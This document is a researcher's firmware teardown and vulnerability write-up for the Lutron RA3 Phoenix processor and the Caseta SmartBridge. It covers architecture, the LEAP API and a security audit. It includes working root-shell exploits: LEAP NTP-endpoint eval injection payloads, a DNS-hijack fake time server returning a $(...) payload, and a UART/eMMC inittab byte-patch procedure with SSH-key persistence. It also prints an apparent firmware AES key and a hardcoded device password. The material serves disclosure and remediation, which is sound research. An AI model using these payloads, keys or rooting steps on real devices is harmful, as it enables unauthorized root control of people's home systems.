# Phoenix RA3 Processor Rootfs Analysis (v26.01.13f000)

Decrypted from `firmware-downloads.iot.lutron.io/phoenix/final/26.01.13f000/lutron_firmware`
using AES-128-CBC key `6cba80b2bf3cf2a63be017340f1801d8` extracted from Phoenix eMMC.

Rootfs extracted to `data/firmware/phoenix/v26.01.13f000/`.

## Architecture Overview

AM335x (Cortex-A8) running Linux 5.10, BusyBox, with Silicon Labs EFR32 coprocessor(s)
for all RF communication. Go services handle LEAP/LAP/HAP; C++ `lutron-core` handles
radio protocol engine.

### Key Binaries

| Binary | Size | Lang | Purpose |
|--------|------|------|---------|
| `multi-server-phoenix.gobin` | 30MB | Go | LEAP/LAP/HAP/MQTT server |
| `lutron-core` | 25MB | C++ | Core protocol engine (CCA+CCX) |
| `domain-object-manager.gobin` | 14MB | Go | Database/object management |
| `secure-channel.gobin` | 8MB | Go | Encrypted comms (WebSocket/TLS) |
| `internet-connectivity-monitor.gobin` | 3.5MB | Go | Cloud connectivity watchdog |
| `lutron-eol` | 1.2MB | C++ | Factory test server (port 3490) |
| `secure-element-engine` | 419KB | C++ | ATECC608 secure element driver |
| `lutron-button-engine` | 291KB | C++ | Button/pico event processor |
| `lutron-core-client` | 239KB | C++ | Core IPC client |
| `lutron-led-ui` | 218KB | C++ | LED indicator controller |
| `lutron-eeprom-engine` | 110KB | C++ | EEPROM R/W daemon |

## Radio Architecture: EFR32 Coprocessors

The AM335x does NOT directly interface with any radio. All RF goes through
Silicon Labs EFR32 coprocessor(s) via UART/HDLC using the CLAP protocol
(Clear-connect Link Abstraction Protocol).

### Coprocessor Communication

- Protocol: CLAP over HDLC framing over UART
- Baud rate: 230400
- Source: `core-support/lutron-hdlc/lutron-hdlc.cpp`, `core-support/lutron-coproc-manager/clap-link-manager/`
- Coprocessor firmware: S19 format, e.g. `SB_EFR_128K_00.00.03.s19`
- CLAP tunnel socket: `/tmp/ClapTunnelServer.sock`

### Link Drivers in lutron-core

| Driver | Protocol | Frequency |
|--------|----------|-----------|
| `CCA_LINK_DRIVER` | CCA (433 MHz) | Link types 7, 9, 11 |
| `PEGASUS_LINK_DRIVER` | CCX/Thread (2.4 GHz) | Link type 31 |
| `GLINK_LINK_DRIVER` | QS Link (wired RS-485) | Wired |

### Hardware Variants (rfs_* overlays)

Each overlay configures `etc/lutron.d/lutron.conf` for a different product SKU:

| Overlay | ttyS1 (Link 0) | ttyS2 (Link 1) | Product |
|---------|-----------------|-----------------|---------|
| `rfs_wireless` | Pegasus (CCX, type 31) | -- | RA3 standard |
| `rfs_janus` | Pegasus (CCX, type 31) | James RF (CCA, type 9) | RA3 dual-radio |
| `rfs_wired` | QS (CCA, type 7) | QS (CCA, type 7) | HWQSX 2-link |
| `rfs_wired_one_link` | QS (CCA, type 7) | -- | HWQSX 1-link |
| `rfs_zero_link` | (none) | (none) | Wired-only/test |

Janus = dual-radio RA3 processor with both CCX and CCA coprocessors. This is how RA3
bridges legacy CCA devices (picos, dimmers) into the Thread mesh.

### Link Types (from domain-object-info.sqlite)

| ID | Description |
|----|-------------|
| 7 | QS Link |
| 9 | Clear Connect A (Caseta/RA2) |
| 11 | HomeWorks Clear Connect A |
| 30 | Vive Clear Connect Link |
| 31 | Clear Connect X (Pegasus) |
| 33 | GreenPHY |
| 34 | DALI Type 8 |

## CCX/Thread Implementation

Thread stack is **fully proprietary** — zero OpenThread references. The EFR32MG12 NCP
runs the complete Thread mesh stack. Linux sees only CLAP frames.

Key modules in lutron-core:
- `modules/pegasus-firmware-update/` — OTA firmware distribution
- `modules/pegasus-startup/` — Network info exchange, device addressing
- `modules/experimental-ccx-network-beacon/` — Mesh health beacons
- `modules/link-diagnostics/ccx-network-graph/` — Topology tracking
- `modules/clear-connect-addressing-mode/receiver/pegasus-link-receiver/` — Device pairing

### Secure Element (ATECC608)

I2C bus 1, address 0xC0, 16 slots:

| Slot | Type | Purpose |
|------|------|---------|
| 0-4 | ECC private | Integration/client TLS keys |
| 5 | ECC private | Spare |
| 6 | AES-128 | Firmware decryption key (from external file) |
| 7 | AES-128 | AESKey1Shared |
| 8 | Secret data | SecretData1 |
| 9 | AES-128 | AESKey2Shared |
| 10-11 | AES-128 | Processor-specific (internal) |
| 12-13 | ECC public | Firmware signature verification |
| 14 | ECC public | Spare |
| 15 | Secret data | SecretData2 |

## CCX Device Firmware Codenames

From `device-firmware-manifest.json` and `phoenix-device-firmware-package.tar.gz`:

| Codename | DeviceClass | Device Type |
|----------|------------|-------------|
| dart | 0x045E/045F/0127/0467 | Diva Smart / Darter (dimmer, switch, keypad, fan) |
| thin-mint | 0x1B060101 | Sunnata dimmer |
| thin-mint-remodeler | 0x1B060301 | Sunnata dimmer (remodeler) |
| powerbird | 0x012B-012E | Sunnata toggle/hybrid devices |
| hercules | 0x1626/1627 | Occupancy/vacancy sensor |
| lorikeet | 0x061A0101 | MG12-based repeater (confirms EFR32MG12) |
| omnikeet | 0x061E0101 | Repeater variant |
| kit-kat | 0x06190201 | RF dongle internal engine ("drone master") |
| rf-dongle | 0x06190201 | USB RF dongle (processor) |
| bulb | 0x1B010101 | Ketra smart bulb |
| downlight | 0x1B030101 | Ketra downlight module |
| lutron-dynamic | 0x1B080101 | Ketra dynamic panel/tile |
| rania-lamp | 0x1B090101 | Ketra Rania lamp |
| robin-trimkit | 0x1B070301 | Ketra trim kit |
| n3-radio | 0x06140101 | N3 processor (radio + MQX RTOS + EFM32 LLE) |
| eagle-owl | 0x031201xx | CCA wired relay/dimmer |
| bananaquit-avis | 0x0314/030A | CCA occupancy sensor |
| basenji | 0x03150201 | CCA wired device |

Target locations: CCX = Thread, CCA = 433 MHz, LLE = Low Level Engine (EFM32),
LightEngine = dimming coprocessor, N3Wired = MQX RTOS.

## LEAP API

384 endpoint handlers, 773 object types, 14 communique types. See below for full inventory.

### Transport

| Protocol | Port | Transport | Max Clients |
|----------|------|-----------|-------------|
| LEAP cleartext | 8080 | TCP, localhost only | -- |
| LEAP TLS | 8081 | JSON/TLS | 10 |
| LAP | 8083 | mTLS | 25 integrators |
| HAP (HomeKit) | 4548 | TCP | 20 |
| McLEAP | UDP 2647 | Multicast 239.255.255.255 | -- |

### CommuniqueTypes

ReadRequest/Response, CreateRequest/Response, UpdateRequest/Response,
DeleteRequest/Response, SubscribeRequest/Response, UnsubscribeRequest/Response,
ExceptionResponse, CommandResponse.

### Resource Inventory (major categories)

**Core**: `/area`, `/zone`, `/device`, `/button`, `/buttongroup`, `/link`,
`/server`, `/controlstation`, `/virtualbutton`, `/preset`

**Occupancy**: `/occupancygroup`, `/occupancysensor`, `/detectiongroup`

**Scheduling**: `/timeclock`, `/timeclockevent`, `/dailyschedule`, `/weeklyschedule`,
`/countdowntimer`, `/sequence`

**Load control**: `/loadcontroller`, `/zonecontroller`, `/zonetypegroup`, `/load`,
`/fadesettings`, `/ledsettings`, `/led`, `/cci`, `/phasesettings`, `/tuningsettings`

**Shading**: `/shadegroup`

**Lighting features**: `/emergency`, `/daylightsensor`, `/daylightinggaingroup`,
`/naturallightoptimization`, `/naturalshow`, `/daynightmode`, `/curve`

**Presets** (32 assignment types): dimmedlevel, switchedlevel, fanspeed, shadelevel,
shadelevelwithtilt, shadelevelwithtiltwhenclosed, ccolevel, colortuninglevel,
spectrumtuninglevel, whitetuninglevel, warmdim, receptaclelevel, raiselower,
areascene, favoritecycle, nexttrack, pause, playpausetoggle, sonosplay,
occupancysensorsettings, occupancysettings, startemergency, stopemergency, startsequence

**Integrations**: `/service/alexa`, `/service/googlehome`, `/service/homekit`,
`/service/ifttt`, `/service/sonos`, `/service/bacnet`, `/service/ketra`,
`/service/ntpserver`, `/service/openadr`, `/service/autoprog`

**System**: `/system`, `/project`, `/login`, `/clientsetting`, `/ping`,
`/networkinterface`, `/certauthority`, `/datasecurity`, `/nonce`

**Operations**: `/firmwareupdatesession`, `/devicefirmwarepackageupdatesession`,
`/database`, `/databasetransfersession`, `/profilesession`, `/auditlog`,
`/operation/status`

**Previously unknown**: `/intruderdeterrent` (security/alarm), `/rentablespace`
(hospitality), `/thirdpartydevice`, `/alias`

### Subscription Endpoints (44 total)

`/area`, `/area/{id}`, `/area/{id}/status`, `/zone`, `/zone/{id}`, `/zone/{id}/status`,
`/device`, `/device/{id}`, `/device/status/availability`, `/device/status/batterystatus`,
`/button/{id}/status/event`, `/link/{id}/status`, `/virtualbutton`,
`/loadcontroller/{id}/status`, `/occupancysensor/{id}/status`, `/daylightsensor/{id}/status`,
`/emergency/{id}/status`, `/system/status`, `/system/loadshedding/status`,
`/temperaturesensor/status`, `/timeclock/status`, `/timeclockevent/status`,
`/naturallightoptimization/{id}/status`, `/operation/status`, `/project`,
`/profilesession/{id}/status`, `/rentablespace/status`,
`/service/bacnet/settings`, `/service/bacnet/networksettings/{id}`,
and paged/expanded variants.

## Security Audit

### Authentication
- **Root is passwordless** — `root::0:0::/root:/bin/sh`, no shadow file
- SSH: pubkey only, `AllowUsers root support ssh-credentials-transfer u_db-transfer-mngmt u_fwu u_dfp`
- Baked-in SSH key: `abhat@PC0008690` (Lutron employee) in `/home/support/.ssh/authorized_keys`
- Remote SSH key injection: Lutron can push authorized_keys via SFTP credential transfer,
  verified against cert chain (root CA: `lutron-ssh-root`)

### Hardcoded Secrets
- **Firmware decryption keys**: plaintext in `/etc/lutron.d/secure_element_external_keys/`
- **Hotel integration RSA key**: 1024-bit private key at `/etc/hotel-integration/keys/hotelintegration.rsa`
- **Sonos API keys**: 3 UUIDs in `/etc/sonos/sonos_api_keys.json`
- AWS credentials: fetched dynamically (not hardcoded) -- correct approach

### Network Services
| Port | Service | Auth |
|------|---------|------|
| 22 | SSH | Pubkey only |
| 443 | Secure Channel | TLS |
| 3490 | EOL test server | Client cert (runs on every boot!) |
| 4548 | HomeKit HAP | HAP pairing |
| 5353 | mDNS | None |
| 8081 | LEAP TLS | Cert-based |
| 8083 | LAP TLS | mTLS |
| 2647/udp | McLEAP multicast | None |

### Remote Access Paths
1. MQTT via AWS IoT Core (provisioned through `device-login.lutron.com`)
2. AWS IoT Secure Tunneling (`localproxy` binary)
3. SOCKS5 tunnel (`hev-socks5-tunnel`, creates tun0 interface)
4. SSH credential injection (SFTP + cert-verified tar.gz)

### Firewall
- Default INPUT: DROP (good)
- Default OUTPUT: ACCEPT (permissive)
- SSH outbound blocked
- Rate limiting on input rules (100/sec burst 10)

### Telemetry
Fluent-bit ships metrics to AWS Kinesis: CPU, dmesg, battery, zone activity,
occupancy events, energy reports, HVAC metrics, firmware updates, watchdog resets, core dumps.

### File Integrity
`S98-custom-script` checks MD5 sums of critical system binaries (monit, libc, libssl, rsyslogd)
but does NOT checksum SSH keys, firmware decryption keys, or the EOL binary.

## Confirmed Vulnerability: LEAP → Root Shell via eval Injection

**Severity**: Critical (CVSS ~8.8) — CWE-78 (OS Command Injection) via CWE-95 (Eval Injection)

### Summary

Any LEAP integrator can achieve root code execution on the RA3 processor by setting
the NTP server endpoint to a crafted string containing shell metacharacters. The value
passes through an unsafe `eval` in `sqlite_helper.sh` which is used by every shell script
that reads from the platform database.

### Vulnerable Code

`usr/sbin/sqlite_helper.sh` line 42:
```sh
eval "${__return_result}='${sqlite_result}'"
```

`sqlite_result` contains the raw value from SQLite (e.g., the NTP endpoint). If it
contains a single quote `'`, it breaks out of the eval quoting and the remainder
executes as arbitrary shell commands — as root.

### Exploit Chain

1. Attacker sends LEAP `UpdateRequest` to `/service/ntpserver/1`:
   ```json
   {"NTPServerEndpoint":{"Endpoint":"'; COMMAND; echo '"}}
   ```
2. Go binary stores the value in SQLite via parameterized query (no SQL injection,
   but the VALUE is attacker-controlled)
3. Platform triggers chrony config reload → `updateChronyConfHelperScript.sh`
4. Script calls `getNtpUrl.sh` → `sqlite_helper.sh:execute_sqlite_query()`
5. `eval "result=''; COMMAND; echo ''"` executes COMMAND as root
6. Trigger is automatic — occurs on NTP config change

### Proof of Concept (tested 2026-04-01 on v26.01.13f000)

Payload to inject SSH authorized key for persistent root access:
```
'; mkdir -p /root/.ssh; echo 'ssh-ed25519 AAAA... user' >> /root/.ssh/authorized_keys; echo '
```

Result:
```
$ ssh -i ~/.ssh/id_ed25519_lutron root@10.0.0.1
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
Lutron-08676308
# uname -a
Linux Lutron-08676308 5.10.208-001-ts-armv7l #1 Thu Mar 5 02:56:32 UTC 2026 armv7l GNU/Linux
```

### Prerequisites

- Valid LEAP TLS certificate (integrator pairing via `/server/leap/pairing`)
- Network access to processor port 8081

### Scope

`sqlite_helper.sh` is sourced by **every shell script** that reads from the database:
- `getNtpUrl.sh` (NTP endpoint) — confirmed exploitable
- `getNtpServerType.sh` (NTP type)
- `select_active_database.pyc` callers
- Any init script using `execute_sqlite_query()`

Any user-controllable string stored in the platform SQLite database that is later
read by a shell script via `sqlite_helper.sh` is a potential injection vector.
The NTP endpoint is the easiest because it's directly writable via LEAP with no
additional validation.

### Additional sed Vulnerability

`usr/sbin/updateChronyConfHelperScript.sh` line 114 also has an injection:
```sh
sed "s|#server CUSTOM_NTP_URL|server ${new_ntp_url}|g; ..." ${CHRONY_CONFIG_FILE} >...
```

The `|` sed delimiter in the value breaks the substitution. However, BusyBox sed
lacks the GNU `e` flag, so this is limited to chrony config injection (time
manipulation, NTP MITM) rather than direct code execution. The `eval` vulnerability
in `sqlite_helper.sh` is the more severe issue.

### Remediation

1. Replace `eval` with direct variable assignment: `printf -v "${__return_result}" '%s' "${sqlite_result}"`
2. Add input validation in the Go LEAP handler for NTP endpoint (hostname/IP only)
3. Quote all shell variables in sed expressions

## Confirmed Vulnerability: Caseta SmartBridge — DNS Hijack → Root Shell via eval Injection

**Severity**: Critical — CWE-78 (OS Command Injection) via DNS spoofing + unsafe `eval`

### Summary

The Caseta SmartBridge (L-BDG2-WH, firmware v08.25.17f000) can be rooted via a DNS hijack
attack that exploits an unsafe `eval` in `getTimeFromURL.sh`. The bridge fetches time from
`http://device-login.lutron.com` (plain HTTP, no TLS) as a backup when NTP fails. The
server response is passed through `eval` without sanitization.

### Differences from Phoenix (RA3) Attack

| Aspect | Phoenix (RA3) | Caseta SmartBridge |
|--------|--------------|-------------------|
| **Entry point** | LEAP `UpdateRequest /service/ntpserver/1` | DNS hijack of `device-login.lutron.com` |
| **Vulnerable code** | `sqlite_helper.sh:42` `eval` | `getTimeFromURL.sh:97` `eval` |
| **Auth required** | LEAP integrator cert (pairing) | None (DNS spoofing) |
| **Network position** | Any LEAP client on network | Must control DNS or be MITM |
| **Trigger** | Automatic on NTP config change | Requires NTP failure + 10min wait |
| **TLS** | N/A (DB write) | None — plain HTTP to time server |
| **Prerequisites** | Paired LEAP cert | DNS control + NTP blocked |

### Caseta Attack Chain

1. **Block NTP** — firewall rule dropping UDP:123 from the bridge
2. **DNS hijack** — point `device-login.lutron.com` to attacker's IP
3. **Serve exploit** — HTTP server returns `$(COMMAND)` as response body
4. **Wait** — bridge boots, chrony fails (NTP blocked), after ~10 minutes the
   backup time fetch triggers `getTimeFromURL.sh`
5. **eval fires** — `eval ${returnDateTime}=$(mkdir -p /root/.ssh && echo 'KEY' >> /root/.ssh/authorized_keys && echo 0)` executes as root

### Vulnerable Code

`usr/sbin/getTimeFromURL.sh` line 97:
```sh
eval ${returnDateTime}=${responseData}
```

`responseData` is the HTTP response body from the time server, parsed by `parseCurlOuput()`.
The curl command has NO TLS verification (plain HTTP):
```sh
readonly CURL_POST_COMMAND="curl -w ${HTTP_CODE_STRING}=%{http_code} -X POST"
```

The time server URL is hardcoded in `/etc/lutron.d/timeUrls`:
```json
{"Username":"lutron-bridge", "Password":"Lutr0n@1", "Url":"http://device-login.lutron.com/api/v1/devices/utctime"}
```

### Proof of Concept (tested 2026-04-01 on v08.25.17f000)

Exploit server (`tools/fake-time-server.py`):
```python
# Responds to POST /api/v1/devices/utctime with:
PAYLOAD = "$(mkdir -p /root/.ssh && echo 'KEY' >> /root/.ssh/authorized_keys && echo 0)"
```

Setup:
```bash
# 1. DNS override: device-login.lutron.com -> attacker IP
# 2. Block NTP: firewall drop UDP:123 from bridge
# 3. Run server: sudo python3 tools/fake-time-server.py
# 4. Power cycle bridge, wait ~10 minutes
```

Result:
```
$ ssh -i ~/.ssh/id_ed25519_lutron root@10.0.0.7
uid=0(root) gid=0(root) groups=0(root)
Lutron-04d0b591
Linux Lutron-04d0b591 5.10.208-001-ts-armv7l #1 Thu Dec 4 09:36:05 UTC 2025 armv7l GNU/Linux
```

### Additional eval Injection in `curlscript.sh`

The firmware update script `curlscript.sh` line 268 has the same pattern:
```sh
eval $returnValue="'$fieldData'"
```
Where `$fieldData` is parsed from the firmware update server's JSON response (`Url` field).
This requires HTTPS MITM of `firmwareupdates.lutron.com` (TLS-verified against system
CA bundle), making it harder to exploit than the HTTP time server path.

### Scope

The `getTimeFromURL.sh` vulnerability affects ALL Caseta SmartBridge and RA2 Select
bridges running firmware v08.25.17f000 (and likely all versions with the backup time
feature). The `curlscript.sh` vulnerability affects the firmware update path on all
Lutron products using this shared shell script infrastructure.

### Remediation

1. Use HTTPS for the backup time server (not plain HTTP)
2. Replace `eval` with safe assignment: `returnDateTime="${responseData}"`
3. Validate the time server response is a numeric timestamp before use
4. Remove hardcoded credentials from `timeUrls` config file

## UART Boot & eMMC Access

Standalone ARM assembly program boots the RA3/HWQSX Phoenix processor (AM335x) via UART, reads eMMC sectors directly into SRAM (no DDR required), and dumps them over UART. A Python script on a Raspberry Pi automates the boot, navigates the ext4 filesystem, and extracts files.

This was used to extract firmware upgrade SSL keys from `/etc/ssl/` on the rootfs partition.

### Extracted Data

All saved to `data/phoenix-ssl/`:

| File | Type | Size | Purpose |
|------|------|------|---------|
| `primary.pub` | RSA-4096 | 800B | Primary firmware upgrade signature verification |
| `secondary.pub` | RSA-4096 | 800B | Secondary/backup firmware upgrade verification |
| `firmwaresigning.pem` | X.509 RSA-2048 | 1.6KB | Self-signed cert from "Lutron/Phoenix Processors" OU, valid 2020-2120 |
| `eol-auth.pub` | RSA-2048 | 451B | End-of-Life authentication |
| `key_generation.md` | text | 973B | Internal docs -- refs git.intra.lutron.com LPFU repo |

### Hardware Setup

- **SoC**: AM335x-GP rev 2.1 (TI Sitara Cortex-A8), 26 MHz crystal
- **eMMC**: On MMC1 (MMCHS1 at 0x481D8100), GPMC bus pins
- **UART boot**: Ground SYSBOOT2 (TP701) at power-on
- **Raspberry Pi 5**: UART0 (/dev/ttyAMA0) at 115200 8N1, GPIO17 relay (active-LOW) for PoE power cycling

#### Wiring (Pi -> Phoenix)

| Pi Pin | Phoenix | Signal |
|--------|---------|--------|
| GPIO14 (TXD) | UART0 RX | Serial data to Phoenix |
| GPIO15 (RXD) | UART0 TX | Serial data from Phoenix |
| GND | GND | Common ground |
| GPIO17 | PoE relay | Active-LOW power control |

TP701 (SYSBOOT2) must be grounded during power-on to force UART boot mode.

### How to Reproduce

#### Prerequisites

On Mac (build host):
- `arm-none-eabi-as`, `arm-none-eabi-ld`, `arm-none-eabi-objcopy` (from `arm-none-eabi-gcc` homebrew package)

On Raspberry Pi:
- Python 3 with `pyserial` and `xmodem` packages
- `pinctrl` command (ships with Pi OS)
- Serial console disabled on /dev/ttyAMA0 (remove `console=serial0,115200` from `/boot/firmware/cmdline.txt`)

#### Step 1: Build the ARM stub

```
cd tools
bash phoenix-emmc-build.sh
```

This produces `emmc-read.bin` (~3KB) -- a standalone ARM program wrapped with an AM335x GP header.

#### Step 2: Deploy to Pi

```
PI=alex@10.0.0.6
scp -i ~/.ssh/id_ed25519_pi emmc-read.bin $PI:~/
scp -i ~/.ssh/id_ed25519_pi phoenix-emmc-dump.py $PI:~/emmc-dump.py
scp -i ~/.ssh/id_ed25519_pi phoenix-emmc-extract.py $PI:~/emmc-extract.py
```

#### Step 3: Read partition table

```
ssh $PI "python3 ~/emmc-dump.py gpt"
```

This power-cycles the Phoenix, sends the ARM stub via XMODEM, reads 34 sectors (GPT), and prints the partition layout.

#### Step 4: Extract files

```
ssh $PI "python3 ~/emmc-extract.py /etc/ssl/firmwareupgrade"
```

This boots the reader, navigates the ext4 filesystem from root to the target directory, and extracts all files to `~/extracted/` on the Pi.

Other useful commands:
```
ssh $PI "python3 ~/emmc-dump.py boot"              # Boot and show diagnostic output
ssh $PI "python3 ~/emmc-dump.py read 0 34"          # Read raw sectors 0-33 to file
ssh $PI "python3 ~/emmc-dump.py interactive"         # Interactive sector read shell
ssh $PI "python3 ~/emmc-extract.py /etc/ssl"         # List /etc/ssl directory
ssh $PI "python3 ~/emmc-extract.py /etc/passwd"      # Extract a single file
```

#### Step 5: Copy files back

```
scp -i ~/.ssh/id_ed25519_pi $PI:~/extracted/* ./
```

### eMMC Partition Layout

GPT with 20 partitions on a 3.7GB eMMC (7.6M sectors):

| # | Name | Start LBA | Size | Notes |
|---|------|-----------|------|-------|
| 0-2 | spl1/spl2/spl3 | 256/512/768 | 128KB each | U-Boot SPL (triple redundancy) |
| 3-5 | uboot1/uboot2/uboot_recovery | 2048/4096/6144 | 1MB each | U-Boot (A/B + recovery) |
| 6 | uboot_env | 8192 | 1MB | U-Boot environment |
| 7-8 | kernel1/kernel2 | 10240/30720 | 10MB each | Linux kernel (A/B) |
| 9 | kernel_recovery | 51200 | 5MB | Recovery kernel |
| 10-12 | devicetree1/2/recovery | 61440/63488/65536 | 1MB each | Device trees (A/B + recovery) |
| 13 | rawbuffer | 67584 | 5MB | Raw data buffer |
| 14 | **rootfs** | **77824** | **500MB** | Primary root filesystem (ext4) |
| 15 | rootfs2 | 1101824 | 500MB | Secondary rootfs (A/B) |
| 16 | recovery_rootfs | 2125824 | 150MB | Recovery rootfs |
| 17 | database | 2433024 | 200MB | Lutron device database |
| 18 | misc_unsynced | 2842624 | 2059MB | Unsynced miscellaneous data |
| 19 | misc_synced | 7059456 | 280MB | Synced miscellaneous data |

### ARM Stub Technical Details

The 3KB ARM assembly program (`phoenix-emmc-read.S`) executes entirely from SRAM -- no DDR initialization needed:

1. **WDT disable** -- prevents watchdog reset during operation
2. **Clock enables** -- L3/L4 interconnect, MMC0/MMC1/MMC2, GPIO1/2/3, UART0
3. **eMMC reset** -- drives GPIO1_20 HIGH to release eMMC RST# line
4. **Pin mux** -- configures GPMC pins for MMC1 (AD0-7 -> data, CSN1 -> CLK, CSN2 -> CMD)
5. **MMC controller init** -- soft reset, 3.3V bus power, 400kHz card clock, init stream
6. **eMMC card init** -- CMD0 (idle), CMD1 (OCR), CMD2 (CID), CMD3 (RCA), CMD7 (select), CMD16 (block size)
7. **Command loop** -- reads sector commands from UART, dumps 512-byte hex blocks

### Key Hardware Discoveries

> **Discovery:** eMMC is on MMC1 -- SYSBOOT[4:0] = 0b11100 (ungrounded) puts MMC1 first in boot order. Confirmed by CTO on MMC0/MMC2 and successful CMD1 on MMC1.

> **Discovery:** GPIO1_20 is eMMC RST# -- without toggling this GPIO HIGH, the eMMC never responds to commands. Same pin as BeagleBone Black.

> **Discovery:** MMC1 CLK needs RXACTIVE -- pin mux must be 0x22 (mode 2 + input enable) not 0x02, for clock feedback.

> **Discovery:** CONTROL_STATUS = 0x00C00358 -- AM335x-GP device, SYSBOOT confirms 26 MHz crystal.

### Firmware Update Chain

1. **Encryption**: AES-128-CBC with symmetric key (extracted from Designer MSIX, documented separately)
2. **Signature**: RSA-4096 verification using `primary.pub` or `secondary.pub` on the device
3. **Signing cert**: Self-signed RSA-2048 X.509 from `firmwaresigning/public.pem`

### Root Shell via inittab Patch (Single-Byte eMMC Write)

The firmware ships with a commented-out UART shell in `/etc/inittab`:
```
#::respawn:-/bin/sh
```

The ARM stub's `P` (patch) command does a read-verify-write-verify cycle on a single eMMC sector. Changing the `#` (0x23) to a newline (0x0A) uncomments the line without changing file size or ext4 metadata:
```
\n::respawn:-/bin/sh
```

BusyBox init reads the empty id field -> opens `/dev/console` (UART) -> root shell.

#### Rooting Procedure

1. **Find inittab physical location** (one-time):
   - inittab = inode 97791, extent at physical block 406467
   - Target byte at file offset 741 = LBA 0xD9787, byte offset 0xE5

2. **Boot the ARM stub** (SYSBOOT2 grounded, UART via Pi):
   ```
   ssh $PI "python3 ~/emmc-dump.py boot"
   ```

3. **Patch the byte** (from ARM stub prompt):
   ```
   P 000D9787 E5 23 0A
   ```
   The stub reads the sector, verifies byte 0xE5 is 0x23, writes 0x0A, re-reads to verify.

   Note: first attempt used 0x20 (space) which failed -- BusyBox interpreted the space as TTY device name `/dev/ `. Newline (0x0A) creates an empty line + `::respawn:-/bin/sh` with empty id = `/dev/console`.

4. **Normal boot** -- unground SYSBOOT2, connect serial adapter, power cycle. Root shell appears on UART at 115200.

5. **Persist SSH access** from the UART shell (see below).

#### SSH Persistence

From the UART root shell, SSH is already running with key-only root login enabled:
```
# sshd_config: AllowUsers root ..., PasswordAuthentication no
# AuthorizedKeysFile .ssh/authorized_keys /var/misc/ssh/authorized_keys
```

To persist access, add an SSH public key to one of the authorized paths and it survives reboots. The `/var/misc/ssh/authorized_keys` path is likely the intended location since `/var` is persistent across firmware updates.

#### Important Notes

- **Firmware updates may overwrite rootfs** -- the A/B partition scheme means updates write to the inactive rootfs slot and swap. The inittab patch only modifies one rootfs partition. After an update, the other slot becomes active and the patch is lost. Patch both `rootfs` (partition 14) and `rootfs2` (partition 15) for resilience, or rely on SSH key persistence in `/var/`.
- **The `#` was originally at file offset 741** -- if Lutron changes inittab in a firmware update, the offset will shift. Re-extract and re-locate before patching.

### DDR Bypass Rationale

The original approach was to build a custom U-Boot SPL to fully boot the AM335x (with DDR, U-Boot shell, Linux). This hit two blockers:
1. **DDR bit corruption** -- DQ13/DQ14 physically swapped on the Phoenix PCB, reads back wrong
2. **UART from U-Boot C code** -- PRCM register writes crash from compiled C but work from ARM assembly

> **Discovery:** The eMMC-direct approach bypasses both problems entirely: ARM assembly reads eMMC sectors into the 64KB SRAM, no DDR needed. At 115200 baud, reading a 512-byte sector takes ~140ms. Extracting a few KB of certificates takes under a minute.

### Files

| File | Location | Purpose |
|------|----------|---------|
| `tools/phoenix-emmc-read.S` | project | ARM assembly eMMC reader source |
| `tools/phoenix-emmc-build.sh` | project | Assembles + wraps binary with GP header |
| `tools/phoenix-emmc-dump.py` | project | Pi script: boot + sector reads + GPT parsing |
| `tools/phoenix-emmc-extract.py` | project | Pi script: boot + ext4 navigation + file extraction |
| `tools/phoenix-uart-boot.py` | project | Original XMODEM sender (Mac side) |
| `data/phoenix-ssl/` | project | Extracted SSL keys and certificates |
| `/tmp/phoenix-boot/` | local | Build artifacts, test binaries, DDR experiments |
